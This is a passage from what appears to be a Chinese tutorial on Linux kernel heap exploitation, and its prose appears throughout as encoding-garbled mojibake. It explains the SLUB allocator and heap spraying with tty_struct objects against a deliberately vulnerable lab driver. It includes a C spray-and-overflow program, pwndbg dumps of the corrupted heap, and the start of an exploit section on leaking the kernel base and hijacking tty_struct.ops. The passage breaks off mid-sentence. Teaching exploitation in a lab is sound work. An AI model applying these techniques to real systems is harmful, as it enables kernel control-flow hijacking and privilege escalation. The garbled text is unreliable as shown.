title="å†…æ ¸å †å†…å­˜åˆ†é…ç­–ç•¥"></a>å†…æ ¸å †å†…å­˜åˆ†é…ç­–ç•¥</h3><p>åœ¨å†…æ ¸ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨mmapä»¥é¡µï¼ˆpageï¼‰ä¸ºåŸºæœ¬å•ä½è¿›è¡Œå†…å­˜åˆ†é…ï¼Œä½†æ˜¯è¿™ä¼šå¯¼è‡´å¾ˆå¤šç©ºé—´æµªè´¹ï¼Œå› ä¸ºå¾ˆå¤šæ—¶å€™å¹¶ä¸éœ€è¦è¿™ä¹ˆå¤§çš„å†…å­˜ç©ºé—´ã€‚å› æ­¤ï¼Œä¸ç”¨æˆ·ç©ºé—´ä¸­çš„mallocå‡½æ•°ç±»ä¼¼ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å†…æ ¸ä¸­ä½¿ç”¨kmallocå‡½æ•°ç”³è¯·å†…å­˜ã€‚kmallocä½¿ç”¨äº†å†…æ ¸ä¸­çš„åˆ†é…å™¨ï¼Œä¸»è¦æœ‰SLABã€SLUBå’ŒSLOBä¸‰ç§ã€‚è¿™ä¸‰ä¸ªåˆ†é…å™¨ä¹‹é—´å¹¶ä¸æ˜¯å®Œå…¨ç‹¬ç«‹çš„ï¼Œåœ¨å®ç°ä¸Šæœ‰å…±åŒçš„éƒ¨åˆ†ï¼Œç»Ÿç§°ä¸ºSlabï¼ˆåšæ¿ï¼‰åˆ†é…å™¨ã€‚</p><ol><li><code>SLAB</code>æ˜¯ä»¥ä¸Šä¸‰è€…ä¸­æœ€å¤è€çš„åˆ†é…å™¨ç±»å‹ï¼Œæœ€æ—©ç”±Jeff Bonwickåœ¨Solarisç³»ç»Ÿä¸­å¼•å…¥ï¼Œå…¶åœ¨Linuxä¸­çš„ä»£ç å®ç°ä½äºmm&#x2F;slab.cã€‚</li><li><code>SLUB</code>çš„æ„æ€æ˜¯the unqueued slab allocatorï¼Œç”±Christoph Lameterè®¾è®¡ï¼Œé€‚ç”¨äºå¤§å‹ç³»ç»Ÿï¼Œå®ƒçš„ç‰¹ç‚¹æ˜¯å°½å¯èƒ½å¿«ï¼Œåœ¨Linuxä¸­çš„ä»£ç å®ç°ä½äºmm&#x2F;slub.cã€‚è‡ª2.6.23ç‰ˆæœ¬åï¼Œ<strong>Linuxå†…æ ¸ç”¨SLUBå–ä»£SLABï¼Œä½œä¸ºé»˜è®¤çš„å†…å­˜åˆ†é…å™¨</strong>ã€‚å› æ­¤ï¼Œåç»­æˆ‘ä»¬ä¸»è¦å…³æ³¨çš„æ˜¯é’ˆå¯¹SLUBåˆ†é…å™¨çš„æ”»å‡»æ–¹å¼ã€‚</li><li><code>SLOB</code>çš„æ„æ€æ˜¯simple list of blocksï¼Œä¸»è¦ç”¨äºåµŒå…¥å¼ç³»ç»Ÿï¼Œç‰¹ç‚¹æ˜¯å°½å¯èƒ½è½»é‡ï¼Œåœ¨Linuxä¸­çš„ä»£ç å®ç°ä½äºmm&#x2F;slob.cã€‚</li></ol><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ç®€å•ä»‹ç»ä¸€ä¸‹æ¯ä¸ªåˆ†é…å™¨çš„å…·ä½“å®ç°ã€‚ä¸ªäººè®¤ä¸ºï¼Œåœ¨åˆæ¬¡æ¢ç´¢æ—¶ä¸è¦é™·å…¥çç¢çš„ç»†èŠ‚ï¼Œå¦åˆ™å®¹æ˜“åªè§æ ‘æœ¨ä¸è§æ£®æ—ï¼Œæˆ–è€…ä¸§å¤±åŠ¨åŠ›ã€‚å…ˆäº†è§£æœºåˆ¶å’Œç­–ç•¥å±‚é¢çš„è®¾è®¡ï¼Œç„¶åç»“åˆå…·ä½“çš„æ¼æ´è°ƒè¯•æ¥è§‚å¯Ÿç»†èŠ‚ï¼Œå¦‚æœ‰å¿…è¦ï¼Œå†å›è¿‡å¤´æ¥é˜…è¯»åˆ†é…å™¨å®ç°ä»£ç ï¼Œè¿™æ ·çš„æµç¨‹å¯èƒ½æ›´æœ‰åˆ©äºå­¦ä¹ ã€‚ä»æ”»å‡»è€…çš„è§†è§’å‡ºå‘ï¼Œæˆ‘ä»¬éœ€è¦é‡ç‚¹å…³æ³¨æ¯ä¸ªåˆ†é…å™¨çš„ä»¥ä¸‹ä¸¤ä¸ªå…³é”®ç‚¹ï¼š</p><ol><li>æ ¹æ®è¦åˆ†é…çš„å†…å­˜å¤§å°ï¼Œåˆ†é…å™¨ä»å“ªé‡Œåˆ‡å—ï¼ˆè·å¾—å†…å­˜ï¼‰ã€‚</li><li>åœ¨åç»­çš„åˆ†é…ä¸­ï¼Œåˆ†é…å™¨å¦‚ä½•ç®¡ç†å’Œé‡ç”¨å·²ç»é‡Šæ”¾çš„å†…å­˜ã€‚</li></ol><hr><ul><li>SLABåˆ†é…å™¨<br>SLABåˆ†é…å™¨æœ‰ä»¥ä¸‹ä¸‰ä¸ªç‰¹ç‚¹ï¼š</li></ul><ol><li><strong>æ ¹æ®å¤§å°ä½¿ç”¨ä¸åŒçš„é¡µæ¡†</strong><br>æ ¹æ®æ‰€éœ€å†…å­˜å¤§å°ä½¿ç”¨ä¸åŒçš„é¡µæ¡†ã€‚ä¸libc mallocçš„å†…å­˜åˆ†é…æ–¹å¼ä¸åŒï¼ŒSLABæ ¹æ®å†…å­˜éœ€æ±‚çš„å¤§å°åˆ†é…æ¥è‡ªä¸åŒåŒºåŸŸçš„å†…å­˜ã€‚å› æ­¤ï¼Œåˆ†é…çš„å†…å­˜å—å‰åæ²¡æœ‰ï¼ˆä¸éœ€è¦ï¼‰é•¿åº¦ä¿¡æ¯ã€‚</li><li><strong>ç¼“å­˜ä½¿ç”¨</strong><br>ä½¿ç”¨ç¼“å­˜ã€‚å¯¹äºå°å†…å­˜çš„åˆ†é…æƒ…å†µï¼Œä¼˜å…ˆä½¿ç”¨å¯¹åº”çš„ç¼“å­˜ã€‚å¦‚æœæ‰€éœ€çš„å†…å­˜å¾ˆå¤§ï¼Œæˆ–è€…ç¼“å­˜ä¸ºç©ºï¼Œåˆ™é‡‡ç”¨æ­£å¸¸çš„åˆ†é…æœºåˆ¶ã€‚</li><li><strong>ä½¿ç”¨ä½å›¾ï¼ˆç´¢å¼•ï¼‰ç®¡ç†ç©ºé—²ç©ºé—´</strong><br>ä½¿ç”¨ä½å›¾ç®¡ç†å·²é‡Šæ”¾åŒºåŸŸã€‚åœ¨å†…å­˜é¡µçš„é¡¶éƒ¨ç»´æŠ¤äº†ä¸€ä¸ªä½æ•°ç»„ï¼Œç”¨äºè¡¨ç¤ºè¯¥é¡µæ˜¯å¦å·²é‡Šæ”¾ç‰¹å®šç´¢å¼•çš„åŒºåŸŸã€‚ä¸libc mallocçš„å†…å­˜ç®¡ç†æ–¹å¼ä¸åŒï¼Œå®ƒå¹¶æœªåŸºäºé“¾è¡¨ç®¡ç†ã€‚<br><img src="/EXP_FILE/0cb27e8862ef08e2402663871a61642f_MD5.jpeg"></li></ol><ul><li>SLUBåˆ†é…å™¨<br>SLUBåˆ†é…å™¨æœ‰ä»¥ä¸‹ä¸‰ä¸ªç‰¹ç‚¹ï¼š</li></ul><ol><li><strong>å¦‚ä½•æ ¹æ®å°ºå¯¸ä½¿ç”¨é¡µæ¡†</strong><br>ä¸SLABç±»ä¼¼ï¼ŒSLUBæ ¹æ®æ‰€éœ€å†…å­˜å¤§å°ä½¿ç”¨ä¸åŒçš„é¡µæ¡†ï¼ˆkmalloc-64ã€kmalloc-128ã€kmalloc-256ç­‰ç­‰ï¼‰ã€‚ä¸åŒçš„æ˜¯ï¼ŒSLUBç®¡ç†çš„é¡µæ¡†çš„å¼€å¤´æ²¡æœ‰å…ƒæ•°æ®ï¼ˆå¦‚ç©ºé—²åŒºç´¢å¼•ï¼‰ã€‚é¡µæ¡†æè¿°ç¬¦ä¸­æœ‰æŒ‡å‘ç©ºé—²é“¾è¡¨å¼€å¤´çš„æŒ‡é’ˆã€‚</li><li><strong>ä½¿ç”¨å•å‘åˆ—è¡¨ç®¡ç†ç©ºé—²ç©ºé—´</strong><br>ä¸libcçš„tcacheå’Œfastbinç±»ä¼¼ï¼ŒSLUBä½¿ç”¨å•å‘é“¾è¡¨ç®¡ç†ç©ºé—²åŒºåŸŸã€‚</li><li><strong>ç¼“å­˜ä½¿ç”¨æƒ…å†µ</strong><br>ä¸SLABç±»ä¼¼ï¼Œæ¯ä¸ªCPUéƒ½æœ‰ä¸€ä¸ªcacheï¼Œä½†æ˜¯SLUBåŒæ ·æ˜¯ç”¨å•å‘é“¾è¡¨æ¥ç»´æŠ¤å®ƒä»¬çš„ã€‚<br><img src="/EXP_FILE/06e39f71009be8104b8fcf8cdcfe25fd_MD5.jpeg"><br>å…¶ä¸­ï¼Œé€šç”¨kmem_cacheçš„å¤§å°è¦†ç›–äº†8ã€16ã€32ã€64ã€96ã€128ã€192ã€256ã€512ã€1024ã€2048ã€4096å’Œ8192</li></ol><ul><li>SLOBåˆ†é…å™¨<br>å½“å‰æˆ‘ä»¬æš‚ä¸å…³æ³¨SLOBåˆ†é…å™¨ï¼Œå› æ­¤æš‚æ—¶ç•¥å»è¿™æ®µå†…å®¹ã€‚ç­‰æ—¥åæœ‰éœ€è¦æ—¶å†å›è¿‡å¤´å­¦ä¹ ã€‚</li></ul><h3 id="å †æº¢å‡ºæ¼æ´åˆ©ç”¨æ€è·¯"><a href="#å †æº¢å‡ºæ¼æ´åˆ©ç”¨æ€è·¯" class="headerlink" title="å †æº¢å‡ºæ¼æ´åˆ©ç”¨æ€è·¯"></a>å †æº¢å‡ºæ¼æ´åˆ©ç”¨æ€è·¯</h3><p>å†…æ ¸å †ç”±æ‰€æœ‰é©±åŠ¨ç¨‹åºå’Œå†…æ ¸å…±äº«ã€‚å› æ­¤ï¼Œä¸€ä¸ªé©±åŠ¨ç¨‹åºä¸­çš„æ¼æ´å¯ç”¨äºç ´åå†…æ ¸ç©ºé—´ä¸­çš„å¦ä¸€ä¸ªå¯¹è±¡ã€‚é‚£ä¹ˆï¼Œä¸€ä¸ªéå¸¸è‡ªç„¶çš„æ€è·¯æ˜¯æƒ³åŠæ³•åœ¨è„†å¼±å¯¹è±¡åé¢æ”¾ä¸€äº›æƒ³è¦ç ´åçš„ç›®æ ‡å¯¹è±¡ï¼Œä»è€Œé€šè¿‡å †æº¢å‡ºç¯¡æ”¹è¿™äº›ç›®æ ‡å¯¹è±¡ã€‚å¦‚å‰æ‰€è¿°ï¼ŒSLUBç®¡ç†çš„å¯¹è±¡ä¹‹é—´æ²¡æœ‰å…ƒæ•°æ®ï¼Œå› æ­¤ä¸å¿…è€ƒè™‘å †æº¢å‡ºå¯èƒ½ä¼šç ´åè¿™äº›å…ƒæ•°æ®ã€‚</p><p>å †æº¢å‡ºçš„ä¸€ç§å¸¸è§åˆ©ç”¨æ‰‹æ³•æ˜¯<code>å †å–·ï¼ˆHeap Sprayingï¼‰</code>ï¼Œå®ƒèƒ½å¤Ÿæé«˜å †æº¢å‡ºæ¼æ´åˆ©ç”¨çš„æˆåŠŸç‡å’Œç¨³å®šæ€§ã€‚æ‰€è°“å †å–·ï¼Œå°±æ˜¯åœ¨å †ä¸Šï¼ˆæ— è®ºæ˜¯å†…æ ¸å †è¿˜æ˜¯ç”¨æˆ·æ€å †ï¼‰å¤§é‡ç”³è¯·å†…å­˜ï¼Œå¹¶å¡«å……ç‰¹å®šè½½è·ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå †å–·æ˜¯ä¸€ç§é€šç”¨çš„æ¼æ´åˆ©ç”¨è¾…åŠ©æŠ€æœ¯ï¼Œå¹¶ä¸å±€é™åœ¨å †æº¢å‡ºæ¼æ´åˆ©ç”¨ä¸­ã€‚ç›®å‰æˆ‘è§åˆ°è¿‡ä¸¤ç§å †å–·åˆ©ç”¨åœºæ™¯ï¼š</p><ol><li>åœ¨ç”¨æˆ·æ€PWNä¸­ï¼Œåˆ©ç”¨æŸä¸ªæ¼æ´èƒ½å¤Ÿå°†æ§åˆ¶æµåŠ«æŒåˆ°å †ä¸Šã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡å †å–·â€œnopé›ªæ©‡+shellcodeâ€çš„æ–¹å¼å¯¹å †è¿›è¡Œå¸ƒå±€ï¼Œä½¿å¾—åŠ«æŒçš„ç›®æ ‡å †åœ°å€å¤§æ¦‚ç‡å‘½ä¸­nopé›ªæ©‡éƒ¨åˆ†ï¼Œä»è€ŒæŠµæ¶ˆæ‰ç›¸å½“ä¸€éƒ¨åˆ†éšæœºåŒ–å¯¼è‡´çš„ä¸ç¡®å®šæ€§ï¼Œå®ç°ä»£ç æ‰§è¡Œã€‚</li><li>åœ¨å†…æ ¸æ€PWNä¸­ï¼Œå †æº¢å‡ºæ¼æ´çš„åˆ©ç”¨ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ç³»ç»Ÿè°ƒç”¨æˆ–æ¼æ´æ¨¡å—äº¤äº’ï¼Œåœ¨å †ä¸Šæ”¾ç½®å¤§é‡è„†å¼±å¯¹è±¡åŠä¸€äº›ç›®æ ‡å¯¹è±¡ï¼Œä½¿å¾—è„†å¼±å¯¹è±¡ä¸­çš„å †æº¢å‡ºæ¼æ´è¢«è§¦å‘æ—¶ï¼Œå¤§æ¦‚ç‡å…¶åæ˜¯ä¸€ä¸ªç›®æ ‡å¯¹è±¡ï¼Œå®ç°å¯¹ç›®æ ‡å¯¹è±¡çš„ç¯¡æ”¹ã€‚</li></ol><p>SLUBçš„ç‰¹æ€§å†³å®šäº†åªæœ‰å¤§å°ç›¸åŒçš„å¯¹è±¡æ‰ä¼šä»åŒä¸€ä¸ª<code>kmem_cache</code>åŒºåŸŸåˆ†é…ï¼Œå› æ­¤æˆ‘ä»¬è¦æ ¹æ®è„†å¼±å¯¹è±¡çš„å¤§å°æ¥é€‰æ‹©ç›®æ ‡å¯¹è±¡ã€‚â€œç›®æ ‡å¯¹è±¡çš„é€‰æ‹©â€è¿™ä¸ªè¯é¢˜æœ¬èº«å°±æ˜¯å€¼å¾—å†™ä¸€ç¯‡æ–‡ç« æ¥è®¨è®ºã€ç§¯ç´¯äº†ï¼ŒåŸæ•™ç¨‹ä½œè€…ä¹Ÿç¡®å®å†™äº†ä¸€ç¯‡<a href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628">æ–‡ç« </a>æ¥è®°å½•ä»–å¸¸ç”¨åˆ°çš„ç›®æ ‡å¯¹è±¡ã€‚</p><hr><p>ä»å‰æ–‡å¯çŸ¥ï¼Œæ¼æ´æ¨¡å—ä¸­æ¯æ¬¡ç”³è¯·çš„å†…å­˜å¤§å°ä¸º0x400ï¼Œå³1024ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªåŒæ ·ä»kmalloc-1024åŒºåŸŸåˆ†é…çš„å†…æ ¸å¯¹è±¡ã€‚<code>tty_struct</code>æ­£æ˜¯ç¬¦åˆæ¡ä»¶çš„å†…æ ¸å¯¹è±¡ï¼ˆå¤§å°é€šå¸¸åœ¨0x2c0å·¦å³ï¼‰ï¼Œå®ƒå®šä¹‰åœ¨<a href="https://elixir.bootlin.com/linux/v5.15/source/include/linux/tty.h#L122">include&#x2F;linux&#x2F;tty.h</a>ä¸­</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span>magic<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">kref</span> kref<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">;</span><span class="token comment">/* class device or NULL (e.g. ptys, serdev) */</span><span class="token keyword">struct</span> <span class="token class-name">tty_driver</span> <span class="token operator">*</span>driver<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">tty_operations</span> <span class="token operator">*</span>ops<span class="token punctuation">;</span>    <span class="token comment">// ...</span><span class="token punctuation">&#125;</span> __randomize_layout<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…¶ä¸­ï¼Œ<code>tty_operations *ops</code>åœ¨ç»“æ„ä½“ä¸­çš„åç§»æ˜¯0x18ï¼Œå®ƒåŒ…å«äº†ç›¸å…³çš„æ“ä½œå‡½æ•°ï¼Œå®ƒä»¬å®šä¹‰åœ¨<a href="https://elixir.bootlin.com/linux/v5.15/source/drivers/tty/pty.c">drivers&#x2F;tty&#x2F;pty.c</a>ä¸­ã€‚ä¾‹å¦‚ï¼Œå½“æˆ‘ä»¬å¯¹<code>/dev/ptmx</code>æ‰§è¡Œopenç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œå¯¹åº”çš„æ“ä½œå‡½æ•°<a href="https://elixir.bootlin.com/linux/v5.15/source/drivers/tty/pty.c#L788"><code>ptmx_open</code></a>å°†è¢«æ‰§è¡Œï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> ptmx <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span> <span class="token string">"/dev/ptmx"</span> <span class="token punctuation">,</span> O_RDONLY <span class="token operator">|</span> O_NOCTTY<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨å€ŸåŠ©å †å–·æ‰‹æ³•æˆåŠŸå¸ƒç½®å†…æ ¸å †åï¼Œæˆ‘ä»¬é€šå¸¸åˆ©ç”¨å †æº¢å‡ºæ¼æ´ç¯¡æ”¹ç›®æ ‡å¯¹è±¡çš„ç‰¹å®šå‡½æ•°æŒ‡é’ˆï¼Œæˆ–è€…ä¼ªé€ ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆè¡¨ï¼Œç„¶ååœ¨ç”¨æˆ·ç©ºé—´å¯¹ç›®æ ‡å¯¹è±¡æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œä»è€Œè§¦å‘å®ƒçš„ç›¸åº”æ“ä½œå‡½æ•°ï¼Œç”±äºè¯¥å‡½æ•°æŒ‡é’ˆå·²ç»è¢«ç¯¡æ”¹ä¸ºä¸€ä¸ªæ¶æ„çš„åœ°å€ï¼Œå†…æ ¸æ§åˆ¶æµå°†è¢«åŠ«æŒã€‚</p><h3 id="å †å–·å°„"><a href="#å †å–·å°„" class="headerlink" title="å †å–·å°„"></a>å †å–·å°„</h3><p>å°±åƒä¹‹å‰ç ”ç©¶æ ˆæº¢å‡ºä¸€æ ·ï¼Œæˆ‘ä»¬å…ˆç¼–å†™ä¸€ä¸ªç®€å•çš„ç¨‹åºæ¥è§¦å‘å †æº¢å‡ºï¼Œç„¶ååœ¨GDBä¸­çœ‹ä¸€çœ‹æº¢å‡ºæ—¶å †å†…å­˜çš„å¸ƒå±€æ˜¯æ€æ ·çš„</p><pre class="line-numbers language-c" data-language="c"><div class="caption"><span>TI:"æµ‹è¯•ä»£ç "</span></div><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> spray<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">50</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">,</span> O_RDONLY <span class="token operator">|</span> O_NOCTTY<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">,</span> O_RDONLY <span class="token operator">|</span> O_NOCTTY<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x500</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token char">'A'</span><span class="token punctuation">,</span> <span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">close</span><span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šè¿°ä»£ç é¦–å…ˆåœ¨å†…æ ¸å †ä¸Šå–·å°„äº†50ä¸ª<code>tty_struct</code>ç»“æ„ä½“ï¼Œç„¶åä¸ºæ¼æ´æ¨¡å—åœ¨å †ä¸Šç”³è¯·äº†0x400å¤§å°çš„å†…å­˜ç©ºé—´ï¼Œæœ€ååˆå–·å°„äº†50ä¸ª<code>tty_struct</code>ç»“æ„ä½“ã€‚</p><p>è¿™æ ·ä¸€æ¥ï¼Œæœ‰å¾ˆå¤§æ¦‚ç‡å‡ºç°è¿™æ ·çš„å †å¸ƒå±€ï¼šæ¼æ´æ¨¡å—çš„0x400å¤§å°çš„<code>g_buf</code>ç¼“å†²åŒºå‰åéƒ½æ˜¯<code>tty_struct</code>ç»“æ„ä½“ã€‚</p><p>åœ¨moudle_writeä¸‹æ–­ç‚¹ï¼Œæˆ‘ä»¬æ‰¾åˆ°g_bufæŒ‡å‘çš„åœ°å€ï¼Œè§‚å¯Ÿå †å¸ƒå±€ï¼š</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">pwndbg> p &amp;g_buf$2 = (&lt;data variable, no debug info> *) 0xffffffffc0014400 &lt;g_buf>pwndbg> x/gx 0xffffffffc00144000xffffffffc0014400 &lt;g_buf>:0xffff888003101000pwndbg> x/4gx 0xffff888003101000-0x400*20xffff888003100800:0x00000001000054010x00000000000000000xffff888003100810:0xffff88800265ee400xffffffff81c38880pwndbg> x/4gx 0xffff888003101000-0x4000xffff888003100c00:0x00000001000054010x00000000000000000xffff888003100c10:0xffff88800265ef000xffffffff81c38760pwndbg> x/4gx 0xffff8880031010000xffff888003101000:0x00000000000000000x00000000000000000xffff888003101010:0x00000000000000000x0000000000000000pwndbg> x/4gx 0xffff888003101000+0x4000xffff888003101400:0x00000001000054010x00000000000000000xffff888003101410:0xffff88800265ee400xffffffff81c38880pwndbg> x/4gx 0xffff888003101000+0x400*20xffff888003101800:0x00000001000054010x00000000000000000xffff888003101810:0xffff88800265ef000xffffffff81c38760pwndbg> x/4gx 0xffff888003101000+0x400*30xffff888003101c00:0x00000001000054010x00000000000000000xffff888003101c10:0xffff88800265ee400xffffffff81c38880<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»§ç»­åœ¨GDBä¸­æ‰§è¡Œï¼Œå®Œæˆcopy_from_user(g_buf, buf, count)æ“ä½œï¼Œå®ç°å †æº¢å‡ºã€‚æº¢å‡ºåï¼Œå†æ¬¡æŸ¥çœ‹g_bufåŠå…¶åçš„å†…å­˜ï¼Œå¯ä»¥å‘ç°åé¢ç¬¬ä¸€ä¸ªtty_structç»“æ„ä½“çš„å¼€å§‹éƒ¨åˆ†å·²ç»è¢«æº¢å‡ºæ•°æ®è¦†ç›–ï¼š</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">pwndbg> x/4gx 0xffff8880031010000xffff888003101000:0x41414141414141410x41414141414141410xffff888003101010:0x41414141414141410x4141414141414141pwndbg> x/4gx 0xffff888003101000+4000xffff888003101190:0x41414141414141410x41414141414141410xffff8880031011a0:0x41414141414141410x4141414141414141<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å®Œæˆäº†ç¬¬ä¸€æ¬¡å †å–·ã€‚</p><p>åœ¨å€ŸåŠ©å †å–·æ‰‹æ³•æˆåŠŸå¸ƒç½®å†…æ ¸å †åï¼Œæˆ‘ä»¬é€šå¸¸åˆ©ç”¨å †æº¢å‡ºæ¼æ´ç¯¡æ”¹ç›®æ ‡å¯¹è±¡çš„ç‰¹å®šå‡½æ•°æŒ‡é’ˆï¼Œæˆ–è€…ä¼ªé€ ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆè¡¨ï¼Œç„¶ååœ¨ç”¨æˆ·ç©ºé—´å¯¹ç›®æ ‡å¯¹è±¡æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œä»è€Œè§¦å‘å®ƒçš„ç›¸åº”æ“ä½œå‡½æ•°ï¼Œç”±äºè¯¥å‡½æ•°æŒ‡é’ˆå·²ç»è¢«ç¯¡æ”¹ä¸ºä¸€ä¸ªæ¶æ„çš„åœ°å€ï¼Œå†…æ ¸æ§åˆ¶æµå°†è¢«åŠ«æŒã€‚</p><h2 id="ä¸‰-EXP"><a href="#ä¸‰-EXP" class="headerlink" title="(ä¸‰)EXP"></a>(ä¸‰)EXP</h2><p>module_read å¯ä»¥å¯¹g_bufæŒ‡å‘çš„å †å—è¶Šç•Œè¯»ï¼Œæˆ‘ä»¬å¯ä»¥è¯»å–å…¶ç›¸é‚»ttyç»“æ„ä½“çš„tty_struct.opsæŒ‡é’ˆï¼Œä»¥æ­¤æ³„éœ²å†…æ ¸åŸºåœ°å€</p><p>æ”»å‡»æ€è·¯ï¼šå †å–·å°„å¸ƒå±€ï¼Œé€šè¿‡å †æº¢å‡ºç¯¡æ”¹tty_struct.opsæŒ‡é’ˆåˆ°ç”¨æˆ·æ€çš„ä¼ªé€ 